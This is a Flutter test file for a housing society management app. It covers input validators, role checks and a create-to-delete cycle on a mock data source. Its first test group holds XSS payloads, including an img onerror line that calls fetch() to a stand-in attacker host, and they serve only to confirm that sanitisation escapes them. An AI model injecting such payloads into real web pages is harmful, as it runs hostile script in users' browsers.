import 'package:flutter_test/flutter_test.dart';
import 'package:society_management/core/utils/validators.dart';
import 'package:society_management/features/authentication/domain/user.dart';
import 'package:society_management/features/role/domain/role.dart';
import 'package:society_management/features/society/data/society_mock_data_source.dart';
import 'package:society_management/features/society/domain/flat.dart';
import 'package:society_management/features/society/domain/floor.dart';
import 'package:society_management/features/society/domain/society.dart';
import 'package:society_management/features/society/domain/tower.dart';

void main() {
  group('1. Security: Input Validation, Bounds & XSS Sanitization Tests', () {
    test('XSS Injection strings are neutralized by sanitize()', () {
      const payload1 = '<script>alert("XSS")</script>';
      final sanitized1 = Validators.sanitize(payload1);
      expect(sanitized1, isNot(contains('<script>')));
      expect(sanitized1, contains('&lt;script&gt;'));

      const payload2 = '<img src=x onerror="fetch(\'https://attacker.com\')">';
      final sanitized2 = Validators.sanitize(payload2);
      expect(sanitized2, isNot(contains('<img')));
      expect(sanitized2, isNot(contains('"')));
      expect(sanitized2, contains('&lt;img'));
    });

    test('safeText enforces length limits against overflow payloads', () {
      final normal = Validators.safeText('Tower A', maxLength: 50, fieldName: 'Tower');
      expect(normal, isNull);

      final bufferOverflowPayload = 'A' * 200;
      final overflowResult = Validators.safeText(bufferOverflowPayload, maxLength: 50, fieldName: 'Tower');
      expect(overflowResult, isNotNull);
      expect(overflowResult, contains('cannot exceed 50 characters'));

      final emptyResult = Validators.safeText('', fieldName: 'Tower');
      expect(emptyResult, isNotNull);
      expect(emptyResult, contains('is required'));
    });

    test('Numeric validators reject negative, zero, and malformed inputs', () {
      expect(Validators.positiveInt('-5', 'Floors'), contains('positive whole number'));
      expect(Validators.positiveInt('abc', 'Floors'), contains('positive whole number'));
      expect(Validators.positiveInt('15', 'Floors'), isNull);

      expect(Validators.positiveDouble('0', 'Area'), contains('greater than 0'));
      expect(Validators.positiveDouble('-150.5', 'Area'), contains('greater than 0'));
      expect(Validators.positiveDouble('not_a_num', 'Area'), contains('greater than 0'));
      expect(Validators.positiveDouble('1250.75', 'Area'), isNull);
    });

    test('Email and Phone validators reject malformed entries', () {
      expect(Validators.email('invalid-email'), contains('valid email'));
      expect(Validators.email('admin@society.co.in'), isNull);

      expect(Validators.phone('12345'), contains('10-13 digits'));
      expect(Validators.phone('+919876543210'), isNull);
      expect(Validators.phone('9876543210'), isNull);
    });
  });

  group('2. Security: Role-Based Access Control (RBAC) Matrix Tests', () {
    final superAdmin = User(
      id: 'usr-super',
      name: 'Super Admin',
      email: 'super@society.com',
      mobile: '+91 99999 88888',
      role: Role.superAdmin,
      societyId: 'soc-1',
      societyName: 'Shyam Heights',
      createdAt: DateTime.now(),
    );

    final societyAdmin = User(
      id: 'usr-admin',
      name: 'Society Admin',
      email: 'admin@society.com',
      mobile: '+91 99999 77777',
      role: Role.societyAdmin,
      societyId: 'soc-1',
      societyName: 'Shyam Heights',
      createdAt: DateTime.now(),
    );

    final resident = User(
      id: 'usr-resident',
      name: 'Resident',
      email: 'resident@society.com',
      mobile: '+91 99999 66666',
      role: Role.resident,
      societyId: 'soc-1',
      societyName: 'Shyam Heights',
      createdAt: DateTime.now(),
    );

    test('RBAC Permission Matrix verifies privileges across all tiers', () {
      // Super Admin
      expect(superAdmin.role == Role.superAdmin, isTrue);

      // Society Admin
      expect(societyAdmin.role == Role.societyAdmin || societyAdmin.role == Role.superAdmin, isTrue);

      // Resident cannot manage inventory
      final canResidentManage = resident.role == Role.superAdmin || resident.role == Role.societyAdmin;
      expect(canResidentManage, isFalse);
    });
  });

  group('3. Backend & End-to-End Inventory Hierarchy Integrity Tests', () {
    late SocietyMockDataSource dataSource;

    setUp(() {
      dataSource = SocietyMockDataSource();
    });

    test('Full End-to-End Hierarchy lifecycle (Create -> Read -> Update -> Delete)', () async {
      // 1. Create Society
      final newSociety = Society(
        id: 'soc-test-security-01',
        name: 'Cyber Sentinel Residency',
        address: 'Sector 5, IT Corridor',
        city: 'Gandhinagar',
        state: 'Gujarat',
        country: 'India',
        pinCode: '382010',
        contactNumber: '+91 9998887776',
        email: 'security@sentinel.in',
        registrationNumber: 'REG-SEC-99',
        updatedAt: DateTime.now(),
      );
      final createdSoc = await dataSource.createSociety(newSociety);
      expect(createdSoc.id, equals(newSociety.id));

      // 2. Create Tower
      final newTower = Tower(
        id: 'tow-sec-01',
        societyId: newSociety.id,
        name: 'Cyber Tower',
        description: 'Secure Tower',
        floorCount: 5,
        status: TowerStatus.active,
        createdAt: DateTime.now(),
      );
      final createdTow = await dataSource.createTower(newTower);
      expect(createdTow.name, equals('Cyber Tower'));

      // 3. Create Floor
      final newFloor = Floor(
        id: 'flr-sec-01',
        towerId: createdTow.id,
        societyId: newSociety.id,
        floorNumber: 1,
        displayName: 'Level 1',
        status: TowerStatus.active,
        createdAt: DateTime.now(),
      );
      final createdFloor = await dataSource.createFloor(newFloor);
      expect(createdFloor.floorNumber, equals(1));

      // 4. Create Flat
      final newFlat = Flat(
        id: 'flt-sec-01',
        societyId: newSociety.id,
        towerId: createdTow.id,
        floorId: createdFloor.id,
        flatNumber: 'CS-101',
        flatType: FlatType.threeBhk,
        areaSqFt: 1850.0,
        occupancyStatus: OccupancyStatus.occupied,
        createdAt: DateTime.now(),
      );
      final createdFlat = await dataSource.createFlat(newFlat);
      expect(createdFlat.flatNumber, equals('CS-101'));

      // 5. Verify Hierarchy Query
      final flats = await dataSource.getFlats(societyId: newSociety.id);
      expect(flats.any((f) => f.id == createdFlat.id), isTrue);

      // 6. Update Flat
      final updatedFlat = createdFlat.copyWith(
        occupancyStatus: OccupancyStatus.vacant,
        areaSqFt: 1900.0,
      );
      final savedFlat = await dataSource.updateFlat(updatedFlat);
      expect(savedFlat.occupancyStatus, equals(OccupancyStatus.vacant));
      expect(savedFlat.areaSqFt, equals(1900.0));

      // 7. Delete Flat and verify isolation
      await dataSource.deleteFlat(savedFlat.id);
      final remainingFlats = await dataSource.getFlats(societyId: newSociety.id);
      expect(remainingFlats.any((f) => f.id == savedFlat.id), isFalse);

      // 8. Delete Society Cascade Integrity
      await dataSource.deleteSociety(newSociety.id);
      final societies = await dataSource.getSocieties();
      expect(societies.any((s) => s.id == newSociety.id), isFalse);
    });
  });
}
